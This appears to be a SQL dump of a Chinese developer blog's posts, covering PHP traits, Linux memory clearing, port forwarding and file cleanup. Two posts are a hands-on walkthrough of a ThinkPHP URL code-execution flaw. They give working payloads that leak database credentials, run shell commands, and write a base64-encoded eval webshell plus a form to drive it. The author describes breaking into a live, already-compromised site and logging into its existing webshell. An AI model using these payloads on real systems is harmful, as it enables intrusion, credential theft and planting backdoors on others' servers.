print(&quot;html&nbsp;design&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\nclass&nbsp;Human{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//一个人类掌握的技能\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;eat(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;can&nbsp;eat!&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;run(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;can&nbsp;run!&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;Programmer&nbsp;extends&nbsp;Human{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//一个掌握了安全技能以及web开发技能的人类（程序员）\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;SecurityDev&nbsp;,&nbsp;WebDev;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//使用多个Traits，可以用，隔开。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;writeBlog(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;hava&nbsp;a&nbsp;blog&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\n&nbsp;\r\n&nbsp;\r\n&nbsp;\r\n$programmer&nbsp;=&nbsp;new&nbsp;Programmer();\r\n&nbsp;\r\n$programmer-&gt;eat();\r\n$programmer-&gt;run();\r\n&nbsp;\r\n$programmer-&gt;writeBlog();\r\n&nbsp;\r\n$programmer-&gt;usingHtml();\r\n$programmer-&gt;sqlInjection();</pre><p><span style="color: rgb(153, 153, 153);">输出：</span></p><p>I can eat!<br/>I can run!<br/>I hava a blog<br/>html design<br/>I can Sql Injection</p><p><span style="font-family: 微软雅黑; color: rgb(51, 51, 51); line-height: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;在优先级上，如果子类使用的Traits中存在于基类中相同的方法，则Traits中的方法将会覆写基类的方法。如果子类中有与Traits中同名方法，子类优先。</span></p><p><br/></p><pre class="brush:php;toolbar:false">class&nbsp;Base{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;sayHello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;Hello&nbsp;,&nbsp;&#39;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\ntrait&nbsp;SayHello&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;sayHello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parent::sayHello();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;world&#39;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;MyHelloWorld&nbsp;extends&nbsp;Base{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;SayHello;\r\n}\r\n&nbsp;\r\n&nbsp;\r\n$o&nbsp;=&nbsp;new&nbsp;MyHelloWorld();\r\n$o-&gt;sayHello();</pre><p><span style="font-family: 微软雅黑; color: rgb(153, 153, 153); line-height: 20px;">输出：</span></p><p><br/></p><p><span style="font-family: 微软雅黑; color: rgb(153, 153, 153); line-height: 20px;"></span></p><p><span style="color: rgb(153, 153, 153);">Hello , world</span></p><pre class="brush:php;toolbar:false">trait&nbsp;HelloWorld{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;sayHello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Hello&nbsp;,world&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;TheWorldIsNotEnough{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;HelloWorld;\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;sayHello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Hello&nbsp;,University&nbsp;of&nbsp;JiNan&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\n$o&nbsp;=&nbsp;new&nbsp;TheWorldIsNotEnough();\r\n$o-&gt;sayHello();</pre><p><span style="font-family: 微软雅黑; color: rgb(153, 153, 153); line-height: 20px;">输出：</span></p><p><br/></p><p><span style="color: rgb(153, 153, 153);">Hello ,University of JiNan</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;当一个类引入多个Traits时，如果在多个Traits中存在同名的方法，将会产生一个fatal的错误。</p><p><strong>Fatal error</strong>: Trait method Hello has not been applied, because there are collisions with other trait methods on Test in&nbsp;<strong>D:\\xampp\\htdocs\\test\\Traits\\traits_3.php</strong>&nbsp;on line&nbsp;<strong>29</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;为了解决这个命名的冲突，可以使用insteadof操作符，如果连个都想用，可以配合as使用</p><pre class="brush:php;toolbar:false">trait&nbsp;Trait_1{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;Hello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Trait_1&nbsp;hello&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\ntrait&nbsp;Trait_2&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;Hello(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Trait_2&nbsp;hello&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;Test{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;Trait_1&nbsp;,&nbsp;Trait_2{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Trait_2::Hello&nbsp;insteadof&nbsp;Trait_1;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;Test2{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;Trait_1,&nbsp;Trait_2{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Trait_2::Hello&nbsp;insteadof&nbsp;Trait_1;&nbsp;&nbsp;&nbsp;&nbsp;//优先使用第2个Trait的Hello，\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Trait_1::Hello&nbsp;as&nbsp;Hello2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//使用as给第一个的Hello重命名\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\n$o&nbsp;=&nbsp;new&nbsp;Test();\r\n$o-&gt;Hello();\r\n&nbsp;\r\necho&nbsp;&#39;&lt;br&nbsp;/&gt;&#39;;\r\n&nbsp;\r\n$o2&nbsp;=&nbsp;new&nbsp;Test2();\r\n$o2-&gt;Hello();\r\n&nbsp;\r\necho&nbsp;&#39;&lt;br&nbsp;/&gt;&#39;;\r\n&nbsp;\r\n$o2-&gt;Hello2();</pre><p><br/></p><p>输出：</p><p><br/></p><p><span style="color: rgb(153, 153, 153);">Trait_2 hello</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用as关键字改变方法的可见性。</p><pre class="brush:php;toolbar:false">trait&nbsp;Trait_1&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;Hello&nbsp;(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Hello&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;Test{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;Trait_1{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hello&nbsp;as&nbsp;private;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//将Hello作为private方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;testTrait(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;Hello();\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n}\r\n&nbsp;\r\necho&nbsp;&quot;&lt;pre&gt;&quot;;\r\nReflectionClass::export(&#39;Test&#39;);\r\necho&nbsp;&quot;&lt;/pre&gt;&quot;;</pre><p>输出：</p><p>&nbsp;Class [&nbsp;class Test ] {</p><pre>&nbsp;&nbsp;@@&nbsp;D:\\xampp\\htdocs\\test\\Traits\\traits_4.php&nbsp;17-26\r\n\r\n&nbsp;&nbsp;-&nbsp;Constants&nbsp;[0]&nbsp;{\r\n&nbsp;&nbsp;}\r\n\r\n&nbsp;&nbsp;-&nbsp;Static&nbsp;properties&nbsp;[0]&nbsp;{\r\n&nbsp;&nbsp;}\r\n\r\n&nbsp;&nbsp;-&nbsp;Static&nbsp;methods&nbsp;[0]&nbsp;{\r\n&nbsp;&nbsp;}\r\n\r\n&nbsp;&nbsp;-&nbsp;Properties&nbsp;[0]&nbsp;{\r\n&nbsp;&nbsp;}\r\n\r\n&nbsp;&nbsp;-&nbsp;Methods&nbsp;[2]&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;Method&nbsp;[&nbsp;&nbsp;public&nbsp;method&nbsp;testTrait&nbsp;]&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@&nbsp;D:\\xampp\\htdocs\\test\\Traits\\traits_4.php&nbsp;22&nbsp;-&nbsp;24\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;Method&nbsp;[&nbsp;&nbsp;private&nbsp;method&nbsp;Hello&nbsp;]&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//私有的\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@&nbsp;D:\\xampp\\htdocs\\test\\Traits\\traits_4.php&nbsp;12&nbsp;-&nbsp;14\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;}\r\n}</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不仅仅是类可以使用traits，Traits也可以使用，使用方法跟类是相同的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Traits支持使用abstract方法，使用带有abstract方法的类必须实现该抽象方法才能实例化，否则作为抽象类。</p><pre class="brush:php;toolbar:false">trait&nbsp;Trait_1&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;Hello&nbsp;(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Hello&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;abstract&nbsp;function&nbsp;abstractHello();\r\n}</pre><p><span style="font-family: 微软雅黑; color: rgb(51, 51, 51); line-height: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;静态方法也是支持的，这里不再赘述了，下面是手册上的例子。</span></p><p><br/></p><pre class="brush:php;toolbar:false">&lt;?php\r\ntrait&nbsp;Counter&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;inc()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;static&nbsp;$c&nbsp;=&nbsp;0;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$c&nbsp;=&nbsp;$c&nbsp;+&nbsp;1;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$c\\n&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;C1&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;Counter;\r\n}\r\n&nbsp;\r\nclass&nbsp;C2&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;Counter;\r\n}\r\n&nbsp;\r\n$o&nbsp;=&nbsp;new&nbsp;C1();&nbsp;$o-&gt;inc();&nbsp;//&nbsp;echo&nbsp;1\r\n$p&nbsp;=&nbsp;new&nbsp;C2();&nbsp;$p-&gt;inc();&nbsp;//&nbsp;echo&nbsp;1\r\n?&gt;\r\n&lt;?php\r\ntrait&nbsp;StaticExample&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;doSomething()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;Doing&nbsp;something&#39;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n&nbsp;\r\nclass&nbsp;Example&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;StaticExample;\r\n}\r\n&nbsp;\r\nExample::doSomething();\r\n?&gt;</pre><p><span style="font-family: 微软雅黑; color: rgb(51, 51, 51); line-height: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;属性也是可以定义的，如果在Traits中定义了一个属性，那么使用它的类中就不能再定义相同的属性了，否则会报错的。</span></p><p><br/></p><pre class="brush:php;toolbar:false">&lt;?php\r\ntrait&nbsp;PropertiesTrait&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;$same&nbsp;=&nbsp;true;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;$different&nbsp;=&nbsp;false;\r\n}\r\n&nbsp;\r\nclass&nbsp;PropertiesExample&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;use&nbsp;PropertiesTrait;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;$same&nbsp;=&nbsp;true;&nbsp;//&nbsp;Strict&nbsp;Standards\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;$different&nbsp;=&nbsp;true;&nbsp;//&nbsp;Fatal&nbsp;error\r\n}\r\n?&gt;</pre><p><br/></p><p>&nbsp;报错：</p><p><em><strong>Strict Standards</strong>: PropertiesExample and PropertiesTrait define the same property ($same) in the composition of PropertiesExample. This might be incompatible, to improve maintainability consider using accessor methods in traits instead. Class was composed in&nbsp;<strong>D:\\xampp\\htdocs\\test\\Traits\\traits_5.php</strong>&nbsp;on line&nbsp;<strong>11</strong><br/><br/><strong>Fatal error</strong>: PropertiesExample and PropertiesTrait define the same property ($different) in the composition of PropertiesExample. However, the definition differs and is considered incompatible. Class was composed in<strong>D:\\xampp\\htdocs\\test\\Traits\\traits_5.php</strong>&nbsp;on line&nbsp;<strong>11</strong></em></p><!--?php--><!--?php--><!--?php--><!--?php-->', 'Traits是一种在单继承语言中实现代码重用的机制。Traits通过允许开发人员重用在不同继承树中的多个独立的类中的方法，减少了单继承的限制。它通过定义一种方法去定义了类和Traits的组合的语义，减少了使用的复杂性，也避免了与多继承和代码混入相关的一系列问题。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/f622d839e480f17567cef2a5ff5f8a73.jpg', 'mylxsw', '原创', 1, 0, 1396538110, 1397123913, 0, 'html'),
(338, 'ThinkPHP URL安全漏洞入侵', '<p>下面是来自sebug网站的漏洞信息：<a href="http://sebug.net/vuldb/ssvid-60054" _src="http://sebug.net/vuldb/ssvid-60054">http://sebug.net/vuldb/ssvid-60054</a> </p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539103940042.jpg" title="a.jpg"/></p><p>不过该网站只是给了个测试的方法，并没有给出详细的入侵方式如:</p><p>通过使用 http://localhost/index.php/module/action/param1/$%7B@print(THINK_VERSION)%7D可以获取Thinkphp的版本号</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539152787510.jpg" title="ddcdfc0a28381f30fbda7308a9014c086c06f0b1.jpg"/></p><p>下面是重点：</p><p>&nbsp;</p><p>由此想到了一下可以利用的方式：</p><p>&nbsp; &nbsp;/index.php/module/action/param1/$%7B@print(C(db_name))%7D</p><p>把print(THINK_VERSION)中的THINK_VERSION常量替换，例如：</p><p>&nbsp; &nbsp; 使用C方法，获取数据库配置相关信息：C(DB_NAME)、C(DB_HOST)、C(DB_USER)、C(DB_PWD)等</p><p>&nbsp; &nbsp; 使用D方法或者M方法，查询数据库，最典型的使用方式var_dump(D(Admin)-&gt;select())，能够查询出管理员信息，当然，表名需要猜一下，一般是admin，user等。</p><p>&nbsp; &nbsp;其他PHP函数也是可以执行的。</p><p>另一种方式：</p><p>&nbsp; &nbsp;利用PHP在“·”(Tab键上面的键,URL编码后为%60)之间的内容可以当做命令执行的方式，不管是windows还是Linux下，都可以执行cmd或者是Shell命令。</p><p>&nbsp; &nbsp; 例如：index.php/module/action/param1/$%7B@print(%60ls%60)%7D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------------Linux下</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index.php/module/action/param1/$%7B@print(%60dirls%60)%7D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------------Windows下</p><p>可以获取目录内容。</p><p><br/></p><p><br/></p><p>下面是入侵的几个实例图片：</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539188811459.jpg" title="f9433613728b47100768046dc3cec3fdfd032335.jpg" width="700" height="306" border="0" hspace="0" vspace="0" style="width: 700px; height: 306px;"/>查看到那个站已经被人入侵过了，还有几个木马，于是想办法获取木马密码。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539242599586.jpg" title="956a2f3d8794a4c2b5bf1e8a0ef41bd5af6e39dc.jpg" width="700" height="98" border="0" hspace="0" vspace="0" style="width: 700px; height: 98px;"/><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539270908062.jpg" title="942880c90a46f21f8587a7f2f6246b600e33aec1.jpg" width="700" height="467" border="0" hspace="0" vspace="0" style="width: 700px; height: 467px;"/>通过使用`cat 木马文件名`，然后查看网页源代码，获取网马内容，本地使用base64以及gzinflate解密后获取网马密码，登陆成功。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539314841797.jpg" title="b1fd450b6b63f624551ec0a28744ebf81b4ca331.jpg"/>&#39;</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539340255214.jpg" title="e720861cd21b0ef4d05a61ffddc451da83cb3ec2 (1).jpg"/></p><p><br/></p><p>仅供学习，请勿非法入侵~后果自负。O(∩_∩)O~<img src="http://img.baidu.com/hi/jx2/j_0003.gif"/></p>', 'ThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架，有不少创业公司或者项目都用了这个框架\r\n\r\nThinkPHP不正确过滤用户提交的参数，远程攻击者可以利用漏洞以应用程序上下文执行任意PHP代码', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '原创', 1, 0, 1396539452, 1408288896, 0, 'html'),
(339, 'ThinkPHP URL安全漏洞入侵2 木马写入', '<p>上篇文章提到了简单执行命令的方法，但是有个问题是，输入/&#39;&quot;\\等字符时是出错的，不能进行操作，这就限制了操作的范围，又想了下，终于找到上传木马的方式。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;构造URL地址代码如下：</p><pre class="brush:php;toolbar:false">http://www.xxxxxx.com/index.php/module/action/param1/$%7B@print(%60echo%20%5c%22%3C%3fphp+eval(base64_decode(%22ZXZhbCgkX1BPU1RbImNvZGUiXSk7%22))%3b%3f%3E%5c%22%20%3Efile.php%60)%7D</pre><p><br/></p><p>&nbsp;</p><p>file.php为生成的文件名称，语句同样利用了执行shell命令的方式</p><p>原始命令为：echo &quot;输入的内容&quot; &gt; file.php ,把echo输出的内容重定向到文件中。</p><p>一句话木马代码是：eval($_POST[&quot;code&quot;]);</p><p>把一句话木马进行base64编码后得到ZXZhbCgkX1BPU1RbImNvZGUiXSk7</p><p>于是构造php代码：</p><pre class="brush:php;toolbar:false">&lt;?php&nbsp;eval(base64_decode(&quot;ZXZhbCgkX1BPU1RbImNvZGUiXSk7&quot;));?&gt;</pre><p>把上面的php代码进行url编码：</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539672806613.jpg" title="e2697cd4277f9e2fb0c40baa1f30e924ba99f380.jpg"/></p><p>得到最终代码：</p><pre class="brush:php;toolbar:false">%3c%3fphp+eval(base64_decode(%22ZXZhbCgkX1BPU1RbImNvZGUiXSk7%22))%3b%3f%3e</pre><p>&nbsp;</p><p>可以写入到url地址中了，于是得到了：</p><pre class="brush:php;toolbar:false">http://www.xxxxxx.com/index.php/module/action/param1/$%7B@print(%60echo%20%5c%22%3C%3fphp+eval(base64_decode(%22ZXZhbCgkX1BPU1RbImNvZGUiXSk7%22))%3b%3f%3E%5c%22%20%3Efile.php%60)%7D</pre><p>输入到浏览器地址栏，打开。</p><p>&nbsp;</p><p>至此，完成了写入（写入成功与否与具体服务器权限有关）</p><p>打开http://www.xxxxxx.com/file.php,看到如下图所示，说明写入成功。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539737282267.jpg" title="649d652d07082838a729cdb6b899a9014d08f155.jpg"/></p><p>现在可以用一句话木马客户端发下php代码看是否能够执行。</p><p>test.html</p><pre class="brush:html;toolbar:false">&lt;form&nbsp;action=&quot;http://www.******.com/file.php&quot;&nbsp;method=&quot;post&quot;&gt;\r\n&lt;textarea&nbsp;name=&quot;code&quot;&gt;&lt;/textarea&gt;\r\n&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;提交&quot;&nbsp;/&gt;\r\n&lt;/form&gt;</pre><p>上面的html代码比较简陋，自己测试的。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539773616040.jpg" title="d30d8dc4a7efce1bb120d968af51f3deb58f6569.jpg"/></p><p>结果：</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/03/1396539815398934.jpg" title="31ecf7f1d7ca7bcbeb70d68dbe096b63f724a86a.jpg"/></p><p>\\(^o^)/~赶紧打补丁(⊙o⊙)<img src="http://img.baidu.com/hi/jx2/j_0010.gif"/></p>', '上篇文章提到了简单执行命令的方法，但是有个问题是，输入/''"\\等字符时是出错的，不能进行操作，这就限制了操作的范围，又想了下，终于找到上传木马的方式。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '原创', 1, 0, 1396539925, 1408288918, 0, 'html'),
(341, 'Linux释放内存', '<p>在Linux服务器上运行着WebLogic服务器，但是每隔一段时间就会发现，系统内存占用比较多导致运行性能下降，此时，可以通过释放系统内存以解决。</p><p>执行以下命令释放系统内存：</p><pre class="brush:bash;toolbar:false">sync\r\necho&nbsp;3&nbsp;&gt;&nbsp;/proc/sys/vm/drop_caches</pre><p>如果嫌每次都要执行该命令比较麻烦，可以建立一个定时任务，每隔一段时间自动执行即可。</p><p>保存上述代码为clear_mem.sh文件，赋予权限可执行<br/></p><pre class="brush:bash;toolbar:false">chmod&nbsp;u+x&nbsp;clear_mem.sh</pre><p>添加定时任务，执行</p><pre class="brush:bash;toolbar:false">crontab&nbsp;-e</pre><p>任务如下(每天三点执行)：</p><pre class="brush:bash;toolbar:false">*&nbsp;3&nbsp;*&nbsp;*&nbsp;*&nbsp;/opt/clear_mem.sh</pre><p>保存定时任务即可。</p>', '在Linux服务器上运行着WebLogic服务器，但是每隔一段时间就会发现，系统内存占用比较多导致运行性能下降，此时，可以通过释放系统内存以解决。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/835e93c8337006eaf4c6fedd346fd5ef.jpg', 'mylxsw', '整理', 1, 0, 1397012254, 1413943975, 0, 'html'),
(342, 'Linux实现端口转发', '<p>本文讲述了如何在Linux下实现端口转发，以实现通过VPN连接至远端开放给VPN连接的计算机后，如何通过该计算机代理访问远端内网中其它计算机。</p><p>情景是这样的，A公司给B公司开发了项目，之后需要对B公司的项目进行维护，而该项目是在B公司内网中才能访问的，A公司需要有办法能够连接到B公司才能对项目进行维护，因此，B公司管理员给A公司开放了VPN，但是限制只能访问项目所在服务器，而不能访问其他服务器，现在A公司需要对B公司的该项目进行维护，需要维护数据库中的一些信息，但是数据库与项目不再同一个服务器上，因此，无法直接访问数据库服务器。</p><p>于是就有了下面的办法，用B公司开放的服务器做端口转发，将A公司对B公司数据库服务器的访问请求，通过开放服务器转发到数据库服务器，间接实现对数据库服务器的访问。</p><p><br/></p><p>安装rinetd服务</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.boutell.com/rinetd/">http://www.boutell.com/rinetd/</a></p><p>配置转发规则</p><pre class="brush:bash;toolbar:false">vi&nbsp;/etc/rinetd.conf\r\n规则内容为：\r\n&nbsp;&nbsp;&nbsp;&nbsp;本机IP地址&nbsp;&nbsp;&nbsp;&nbsp;本机端口A&nbsp;&nbsp;&nbsp;&nbsp;目标IP地址&nbsp;&nbsp;&nbsp;&nbsp;目标端口</pre><p>规则生效</p><pre class="brush:bash;toolbar:false">pkill&nbsp;rinetd\r\nrinetd&nbsp;-c&nbsp;/etc/rinetd.conf</pre><p>查看地址映射</p><pre class="brush:bash;toolbar:false">netstat&nbsp;-antup</pre><p><br/></p><p><br/></p><p>接下来，在A公司这边就可以通过访问该开放服务器的【端口A】实现对B公司数据库服务器的访问了。</p><p><br/></p>', '本文讲述了如何在Linux下实现端口转发，以实现通过VPN连接至远端开放给VPN连接的计算机后，如何通过该计算机代理访问远端内网中其它计算机。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/13ebb708b245bf25a03070a02fe18c12.jpg', 'mylxsw', '整理', 1, 0, 1397013323, 1413943959, 0, 'html'),
(343, 'Linux下查找指定类型文件以及删除', '<p>在Linux服务器上运行Weblogic服务器，每次需要关闭Weblogic服务器后，都会在domain下留下一些*.lok的文件，导致下次启动的时候因为这些文件无法启动，因此，需要删除产生的所有.lok文件。</p><p>手动一个一个的删除比较麻烦，需要domain的每个目录都进去看看有没有，有的话删除。</p><p>可以通过执行下面的命令查看有哪些这样的文件和批量删除它们。</p><pre class="brush:bash;toolbar:false">find&nbsp;./&nbsp;-name&nbsp;&quot;*.lok&quot;&nbsp;&nbsp;&nbsp;//&nbsp;查找文件\r\nfind&nbsp;./&nbsp;-name&nbsp;&quot;*.lok&quot;&nbsp;|xargs&nbsp;rm&nbsp;-fr&nbsp;&nbsp;//&nbsp;查找文件并删除</pre><p><br/></p>', '本文描述了如何在Linux服务器上查找指定类型的文件，以及如何批量删除这些文件，比如临时文件，锁文件等。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/e45365be7c8b1e37f974ba90d10cfcc0.png', 'mylxsw', '原创', 1, 0, 1397123405, 1413943943, 0, 'html'),
